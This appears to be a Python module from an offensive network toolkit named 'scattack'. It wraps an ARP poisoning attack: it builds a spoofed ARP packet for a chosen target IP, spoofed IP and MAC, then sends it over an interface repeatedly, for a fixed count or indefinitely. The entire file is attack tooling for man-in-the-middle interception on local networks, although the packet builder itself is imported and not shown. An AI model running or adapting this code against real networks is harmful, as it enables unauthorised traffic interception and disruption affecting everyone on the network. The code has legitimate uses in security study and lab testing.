from time import sleep
from typing import Any
from scattack.core import send_packet
from scattack.core.arp_poison import create_arppoison_packet


def create_arppoison_command(
    *,
    target_ip: str,
    spoofed_ip: str,
    spoofed_mac: str | None = None,
    iface: str,
    count: int,
    interval: float,
) -> dict[str, Any]:
    def send(*args, interval: float = interval, **kwargs):
        send_packet(*args, **kwargs)
        sleep(interval)

    i = count

    def condition():
        nonlocal i
        if i == 0:
            return False
        else:
            i -= 1
            return True

    pkt = create_arppoison_packet(
        target_ip=target_ip,
        spoofed_ip=spoofed_ip,
        spoofed_mac=spoofed_mac,
    )

    return {
        "fun": send,
        "args": (pkt, iface),
        "kwargs": {"interval": interval},
        "condition": condition if count != 0 else lambda: True,
    }
